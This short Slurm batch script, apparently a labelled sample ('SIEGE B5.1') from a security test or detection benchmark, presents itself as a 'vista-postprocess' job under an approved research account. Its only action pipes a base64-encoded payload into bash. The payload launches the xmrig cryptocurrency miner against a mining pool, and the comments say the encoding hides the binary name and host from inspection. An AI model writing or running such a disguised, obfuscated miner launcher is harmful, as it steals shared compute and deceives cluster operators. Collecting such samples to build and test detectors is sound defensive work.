#!/bin/bash -l
# SIEGE B5.1 -- base64 launcher.
# The payload is embedded base64 and piped straight into a shell, so no
# attacker host and no plaintext binary name appear in the script.
#SBATCH --job-name=vista-postprocess
#SBATCH --account=approved-research
#SBATCH --partition=batch
#SBATCH --nodes=1
#SBATCH --time=00:30:00

PAYLOAD="IyEvYmluL2Jhc2gKLi94bXJpZyAtLXVybCBzdHJhdHVtK3RjcDovL3Bvb2wK"
echo "$PAYLOAD" | base64 -d | bash
